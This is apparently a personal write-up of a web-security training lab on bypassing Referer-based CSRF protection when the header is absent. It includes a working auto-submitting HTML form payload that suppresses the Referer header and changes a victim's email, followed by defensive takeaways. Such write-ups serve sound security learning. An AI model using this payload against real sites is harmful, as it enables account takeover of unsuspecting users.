# CSRF Where Referer Validation Depends on Header Being Present

**Difficulty:** Practitioner  
**Vulnerability:** Cross-Site Request Forgery (CSRF)

## 1. Introduction

This lab contains a CSRF vulnerability in the email change functionality. The application attempts to prevent cross-site requests by validating the `Referer` header, but its validation logic has an insecure fallback.

The goal is to exploit this weakness by hosting a malicious HTML page on the exploit server that changes the victim's email address.

## 2. Understanding the Vulnerability

The application checks the `Referer` header to determine where a request originates.

- If the `Referer` header contains the legitimate website's domain, the request is accepted.
- If the header contains a different domain, the request is rejected.
- However, if the `Referer` header is completely absent, the application accepts the request instead of blocking it.

This insecure fallback allows an attacker to bypass the Referer validation mechanism.

## 3. Exploitation

First, I logged in to my account using the provided credentials:

- **Username:** `wiener`
- **Password:** `peter`

Next, I examined the email change functionality and identified that the application used the `Referer` header as a CSRF defense.

I then created an HTML form on the exploit server that automatically submitted a POST request to the email change endpoint.

### Exploit Payload

```html
<form id="form"
      action="https://0a810049036bccc5802ff34d0037009d.web-security-academy.net/my-account/change-email"
      method="POST">

    <input type="hidden" name="email" value="fateh201@gmail.com">
    <meta name="referrer" content="no-referrer">

</form>

<script>
    document.forms["form"].submit();
</script>
```

### How the Payload Works

1. The HTML form sends a POST request to the application's email change endpoint.
2. The hidden input supplies the new email address.
3. The `no-referrer` policy prevents the browser from sending the `Referer` header with the request.
4. The JavaScript automatically submits the form when the page loads.
5. Because the application accepts requests when the `Referer` header is absent, the CSRF protection can be bypassed.

## 4. Result

I hosted the payload on the exploit server and delivered the exploit to the lab's victim. The lab was successfully completed, confirming that the application's Referer validation could be bypassed by removing the header.

## 5. Key Takeaways

- The `Referer` header can be used as part of a CSRF defense, but it must be validated securely.
- Security checks should not automatically trust a request just because a header is missing.
- The `no-referrer` policy can prevent the browser from sending the `Referer` header.
- A robust CSRF defense should use properly validated anti-CSRF tokens and carefully configured cookie protections rather than relying solely on the `Referer` header.

**Conclusion:** The vulnerability was caused by insecure fallback behavior in the Referer validation logic. By suppressing the header and automatically submitting a cross-site POST request, I successfully bypassed the CSRF protection.
